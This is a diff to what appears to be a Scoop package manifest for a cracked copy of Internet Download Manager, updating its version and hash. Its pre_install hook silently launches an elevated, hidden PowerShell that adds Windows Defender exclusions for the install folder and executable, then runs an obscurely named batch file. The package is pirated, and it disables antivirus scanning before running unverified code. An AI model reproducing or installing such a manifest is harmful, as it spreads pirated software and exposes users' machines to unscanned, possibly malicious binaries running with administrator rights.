@@ -1,9 +1,9 @@
 {
-	"version": "6.41.20",
+	"version": "6.41.21",
 	"description": "cracked version of IDM",
 	"homepage": "https://www.wotianna.com/idmpc/",
 	"url": "https://github.com/chenguang217/bucketFiles/releases/download/1.0/IDM.7z",
-	"hash": "md5:d4f4f8f16492d1b59fd515bd18fdd964",
+	"hash": "md5:ec13c88fbcec619704e3a945eee6846f",
 	"extract_dir": "IDM/Bin",
 	"pre_install": [
 		"Start-Process powershell \"Add-MpPreference -ExclusionPath $dir;Add-MpPreference -ExclusionPath $dir\\IDMan.exe;$dir\\``!``)\u7eff\u5316.bat\" -Verb RunAs -WindowStyle hidden -wait",
